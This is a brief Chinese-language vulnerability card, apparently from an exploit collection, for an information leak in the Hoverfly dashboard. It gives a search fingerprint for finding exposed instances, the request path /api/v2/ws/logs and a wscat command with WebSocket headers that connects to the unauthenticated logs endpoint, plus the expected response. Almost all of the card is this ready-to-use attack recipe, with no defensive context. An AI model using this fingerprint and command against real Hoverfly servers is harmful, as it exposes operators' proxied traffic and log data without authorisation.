# Hoverflylogs存在信息泄露漏洞

Hoverflylogs ｜ 信息泄露 ｜ —
- **指纹**：`title="Hoverfly Dashboard"`
- **请求**：`GET /api/v2/ws/logs HTTP/1.1`

**Payload**
```
wscat -c ws://your-ip:port/api/v2/ws/logs
建立ws连接后
Host:
Sec-WebSocket-Key: zpRVZDnNfCd+sYVS/DnNug==
Sec-WebSocket-Version: 13
```
- **响应特征**：200